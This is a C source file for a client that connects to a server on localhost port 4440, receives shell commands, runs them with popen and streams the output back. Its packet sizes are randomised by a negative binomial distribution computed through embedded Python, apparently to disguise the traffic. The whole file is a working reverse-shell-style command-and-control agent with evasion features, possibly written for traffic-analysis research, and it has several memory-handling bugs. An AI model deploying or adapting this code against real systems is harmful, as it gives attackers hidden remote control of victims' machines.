// this version uses python distrubutions.py instead of maths_and_stats.h distributions
#include <Python.h>
#include <math.h>
#include <stdio.h>
#include <stdlib.h> //
//#include <time.h>
#include <string.h>
#include <unistd.h>  //<><
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
//#include "stats/maths_and_stats.h"
#define CMD_BLOCK_SIZE 32

void *strrm(char *str, char *substr)
{
    while ((str = strstr(str, substr)))
    {
        char *jump_substr = str + strlen(substr);
        memmove(str, jump_substr, 1 + strlen(jump_substr));
    }
}

int negative_binomial(double arg_n, double arg_p, int arg_min, int arg_max)
{
    PyObject *pModuleName, *pModule, *pFunction, *pythonArgs, *pValue; //; //*pDict, ; 
    PyObject *n, *p, *min, *max; //v/d/*pArgs, *pValue;
    Py_Initialize();
    PyRun_SimpleString("import sys");
    PyRun_SimpleString("import numpy as np");
    PyRun_SimpleString("sys.path.append(\"../stats/\")");

    pModuleName = PyUnicode_DecodeFSDefault("distargs");
    pModule = PyImport_Import(pModuleName);
    Py_DECREF(pModuleName);

    if (pModule != NULL) 
    {
        pFunction = PyObject_GetAttrString(pModule, "negative_binomial");
        
        if (pFunction && PyCallable_Check(pFunction))
        {
            pythonArgs = PyTuple_New(4);
            n = PyFloat_FromDouble   ( arg_n );
            p = PyFloat_FromDouble( arg_p );  // ,, , , 
            min = PyLong_FromLong( arg_min );
            max = PyLong_FromLong( arg_max );
            if (!n || !p || !min || !max)
            {
                Py_DECREF(pythonArgs);
                Py_DECREF(pModule);
                fprintf(stderr, "Cannot convert argument\n");
                return -1;
            }
            PyTuple_SetItem(pythonArgs, 0, n);
            PyTuple_SetItem(pythonArgs, 1, p);
            PyTuple_SetItem(pythonArgs, 2, min);
            PyTuple_SetItem(pythonArgs, 3, max);
        
            pValue = PyObject_CallObject(pFunction, pythonArgs);
            Py_DECREF(pythonArgs);

            if (pValue != NULL)
            {
                return (int) PyLong_AsLong(pValue);
                Py_DECREF(pValue);
            } else 
            {
                Py_DECREF(pFunction);
                Py_DECREF(pModule);
                PyErr_Print();
                fprintf(stderr, "Call failed\n");
                return -1;
            }
        } else 
        {
            if (PyErr_Occurred())
                PyErr_Print();
            fprintf(stderr, "Cannot find function \"%s\"\n", "beta_negative_binomial");
        }
        Py_XDECREF(pFunction);
        Py_DECREF(pModule);
    } else 
    {
        PyErr_Print();
        fprintf(stderr, "Failed to load \"%s\"\n", "dis2.py");
        return -1;
    }
    if (Py_FinalizeEx() < 0)
        return -1;
}

int main()
{
    // open file to file_pointer .txt // \\ ;; //
    FILE *file_ptr = fopen("../../../files/textfile300k", "rb");  //iii

    // sockets inits
    int socketfd;
    struct sockaddr_in server_addr, client_addr;
    char server_message[256]; // init server_message here

    // create socket
    socketfd = socket(AF_INET, SOCK_STREAM, 0);
    if (socketfd < 0)
    {
        printf("Unable to create socket\n");
        return -1;
    } printf("Socket created successfully");

    int flag = 1;
    setsockopt(socketfd, SOL_SOCKET, SO_REUSEADDR, &flag, sizeof(flag));

    // deactivate Nagle's algorithm...
    setsockopt(socketfd, IPPROTO_TCP, TCP_NODELAY, (char *) &flag, sizeof(flag));

    // open socket file descriptor
    FILE *socket_file = fdopen(socketfd, "w+"); 

    // Set port and IP the same as server-side:
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(4440);  //`200
    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1"); //:w111            111

    //set port and IP for the client:
    client_addr.sin_family = AF_INET;
    client_addr.sin_addr.s_addr = inet_addr("127.0.0.2"); //--INADDR_ANY;§
    client_addr.sin_port = htons(44410);

    if (bind(socketfd, (struct sockaddr *) &client_addr, sizeof(client_addr)) < 0)
    {
        printf("Can't bind!\n");
        return -1;
    }

    // Send connection request to server:
    if (connect(socketfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0)
    {
        printf("Unable to connect\n");
        return -1;
    } printf("Connected with server successfully");
    
    int testee = 0;
	while(1)
    {
        // --------------------- receive command / message -----------------
        
        int endcmd = 0;
        char *inputcmd = (char *) calloc(CMD_BLOCK_SIZE, sizeof(inputcmd));
        size_t current_inblock_size = CMD_BLOCK_SIZE;
        size_t inputcmd_size = 0;
        while(!endcmd)
        {
            // clear servers buffer 
            memset(server_message, '\0', sizeof(server_message));
            
            // Wait for the server's command
            int server_message_size;
            if ((server_message_size = recv(socketfd, server_message, sizeof(server_message), 0)) < 0)
            {
                printf("Error while receiving server's msg\n");
                return -1;
            }
            setsockopt(socketfd, IPPROTO_TCP, TCP_QUICKACK, (char *) &flag, sizeof(flag));
            
            if (server_message_size == 0)
            {
                printf("Server has no more messages to send...");
                return 0;
            }
            
            if (strstr(server_message, "<STAIL>") != NULL)
            {
                strrm(server_message, "<STAIL>");

                inputcmd_size = inputcmd_size + strlen(server_message);
                if (inputcmd_size >= current_inblock_size)
                {
                    current_inblock_size = current_inblock_size*2;
                    inputcmd = realloc(inputcmd, (current_inblock_size+1)*sizeof(inputcmd));
                }
                strcat(inputcmd, server_message);
                endcmd = 1;
            } else 
            {
                inputcmd_size = inputcmd_size + strlen(server_message);
                if (inputcmd_size >= current_inblock_size)
                {
                    current_inblock_size = current_inblock_size*2;
                    inputcmd = realloc(inputcmd, current_inblock_size*sizeof(inputcmd));
                }
                strcat(inputcmd, server_message);
                
            }
        }

        printf("\nRECEIVED COMMAND: %s \n", inputcmd);
        //intputcmd[inputcmd, "\n\r"] = 0;%d! testee, 


        // --------------------- EXECUTE COMMANDS AND STORE STDOUT ---------------------------------
        // Execute command
        //server_message[strlen(server_message)] = '\0';
        inputcmd[strlen(inputcmd)] = '\0';
        char **outputcmd = (char **) malloc(CMD_BLOCK_SIZE * sizeof(*outputcmd));

        FILE *fp = popen(inputcmd, "r");
        free(inputcmd);
        
        // generage pkt len with normal distribution
        //&&#FILE *fp_dist; char input[5];
        //&&#fp_dist = popen("python3 ../stats/distargs.py -m negative_binomial -p 8 0.35", "r");
        //&&#fgets(input, 5, fp_dist); pclose(fp_dist);
        //&&#int bytes_to_read = atoi(input);
        size_t bytes_to_read = negative_binomial(8, 0.35, 2, 70);

        // read for buffer and store in array...
        char buffer[256]; size_t size_read;
        size_t current_cmdblock_size = CMD_BLOCK_SIZE;

        size_t i=0;
        while((size_read = fread(buffer, sizeof *buffer, bytes_to_read, fp)) > 0)
        {
            buffer[size_read] = '\0'; 
            // update current block size
            if (i == current_cmdblock_size)
            {
                current_cmdblock_size = current_cmdblock_size*2;
                if (size_read == bytes_to_read)
                    outputcmd = realloc(outputcmd, current_cmdblock_size*sizeof(*outputcmd));
                else
                    outputcmd = realloc(outputcmd, (current_cmdblock_size+1)*sizeof(*outputcmd));
            }
            // save partial output
            outputcmd[i] = (char *) malloc((3+size_read+1)*sizeof(char));
            sprintf(outputcmd[i], "%03ld", size_read); // or size_read+1... --> TEST!!
            strcat(outputcmd[i], buffer);
            i++;
            if (size_read == bytes_to_read)
            {
                // generage NEXT pkt len with normal distribution
                //FILE *fp_dist; char input[5];
                //fp_dist = popen("python3 ../stats/distargs.py -m negative_binomial -p 8 0.35", "r");
                //fgets(input, 5, fp_dist); pclose(fp_dist);
                //bytes_to_read = atoi(input);
                bytes_to_read = negative_binomial(8, 0.35, 2, 70);//
            } else 
            {
                char endcmd[3+7+1] = "007<C"; strcat(endcmd, "TAIL>"); endcmd[3+7] = '\0';
                outputcmd[i] = (char *) calloc((3+7+1), sizeof(char));
                strcat(outputcmd[i], endcmd); 
                i++;
            }
        } 

        printf("\n i = %d\n", i);
        char tail[7+1] = "<C"; strcat(tail, "TAIL>");
        char endcmd_str[3+7+1] = "007<C"; strcat(endcmd_str, "TAIL>"); endcmd_str[3+7] = '\0';
        int stack = 0;
        if (i == 0)
        {
            printf("\nnull command\n");
            outputcmd[i] = endcmd_str;
            i++;
            stack = 1;
        }
        if (strstr(outputcmd[i-1], tail) == NULL)
        {
            printf("\nola\n");
            outputcmd = realloc(outputcmd, (current_cmdblock_size+1)*sizeof(*outputcmd));
            outputcmd[i] = (char *) calloc((3+7+1), sizeof(char));
            strcat(outputcmd[i], endcmd_str); 
            i++;
        } size_t outputcmd_size = i;

        if (outputcmd_size < current_cmdblock_size)
            outputcmd = realloc(outputcmd, (i+1)*sizeof(*outputcmd));

        // -------------------- SEND STDOUT TO SERVER -------------------------------------
        size_t j;
        for (j = 0; j < outputcmd_size; j++)
        {
            int str_len = strlen(outputcmd[j]);
            if (str_len > 0) {
                setsockopt(socketfd, SOL_SOCKET, SO_SNDBUF, (int *)&str_len, sizeof(str_len));
                write(socketfd, outputcmd[j], str_len);
                fflush(socket_file);
            }
        }

        printf("\noutputcmd_size: %d", outputcmd_size);
        printf("\nSENT COMMAND!\n");

        // ----------------------- FREE DATA ---------------------------------
        size_t k;
        if (stack == 0) {
            for (k = 0; k < outputcmd_size; k++)
                free(outputcmd[k]);
            free(outputcmd);
        }
    }
	close(socketfd);
    fclose(file_ptr);
    return 0;
}
